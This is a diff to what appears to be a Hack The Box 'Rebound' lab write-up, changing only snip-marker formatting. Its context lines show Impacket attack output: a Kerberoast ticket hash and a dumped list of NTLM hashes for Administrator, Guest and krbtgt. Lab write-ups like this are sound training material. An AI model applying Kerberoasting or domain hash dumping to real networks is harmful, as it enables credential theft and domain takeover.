@@ -107,7 +107,7 @@ Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its a
 [*] Flags                         : (0x40a10000) forwardable, renewable, pre_authent, enc_pa_rep
 [*] KeyType                       : rc4_hmac
 [*] Base64(key)                   : oWM+PU+EE4bHhFMJpnG8uw==
-[*] Kerberoast hash               : $krb5tgs$18$USER$REBOUND.HTB$*browser/dc01.rebound.htb*$33332d861 ...[SNIP]... 27870efddc
+[*] Kerberoast hash               : $krb5tgs$18$USER$REBOUND.HTB$*browser/dc01.rebound.htb*$33332d861 ---[SNIP]--- 27870efddc
 [*] Decoding unencrypted data in credential[0]['ticket']:
 [*]   Service Name                : browser/dc01.rebound.htb
 [*]   Service Realm               : REBOUND.HTB
@@ -156,7 +156,7 @@ Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its a
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1108b27a9ff61ed4139d1443fbcf664b:::
-...[SNIP]...
+---[SNIP]---
 [*] Cleaning up..
 ```
 
